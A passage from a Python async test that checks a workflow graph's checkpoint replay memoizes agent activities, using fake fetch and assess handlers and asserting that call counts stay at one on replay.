        state_dir = tmp_path / f"state_{run_uuid}"
        ckpt_mgr = CheckpointManager(base_dir=str(state_dir))

        router = MeshRouter()
        call_counts = {"fetch": 0, "assess": 0}

        async def fake_fetch(payload: dict[str, Any]) -> dict[str, Any]:
            call_counts["fetch"] += 1
            return {"transactions": [{"tx_id": "TX-01", "amount": 100.0}]}

        async def fake_assess(payload: dict[str, Any]) -> dict[str, Any]:
            call_counts["assess"] += 1
            return {"risk_level": "CLEAN"}

        router.register_endpoint(AgentEndpoint(agent_id="fetch_agent"), handler=fake_fetch)
        router.register_endpoint(AgentEndpoint(agent_id="assess_agent"), handler=fake_assess)

        async def node_1(state: State) -> None:
            res = await state.execute_activity(
                activity_name="fetch_act",
                fn=router.route_and_call,
                args=("fetch_agent", {}),
                idempotency_key="idemp-fetch-test",
            )
            state.set("txs", res)

        async def node_2(state: State) -> None:
            txs = state.get("txs")
            res = await state.execute_activity(
                activity_name="assess_act",
                fn=router.route_and_call,
                args=("assess_agent", txs),
                idempotency_key="idemp-assess-test",
            )
            state.set("verdict", res)

        graph = Graph(name="test_memoizer_dag")
        graph.add_node("node_1", node_1)
        graph.add_node("node_2", node_2)
        graph.add_edge("node_1", "node_2")
        graph.set_entry_point("node_1")
        graph.set_finish_point("node_2")

        init_state = State(workflow_id=f"wf-replay-{run_uuid}")

        # Run 1: Cold execution
        state_run1 = await graph.run(init_state, checkpoint_manager=ckpt_mgr)
        assert call_counts["fetch"] == 1
        assert call_counts["assess"] == 1

        # Run 2: Replay from node_1
        state_run2 = await graph.run(
            state_run1,
            checkpoint_manager=ckpt_mgr,
            start_from_node="node_1",
        )

        # Call counts must remain strictly 1
        assert call_counts["fetch"] == 1
        assert call_counts["assess"] == 1

        hits = [e for e in state_run2.events if e.event_type == EventType.ACTIVITY_MEMOIZED_HIT]
        assert len(hits) >= 2
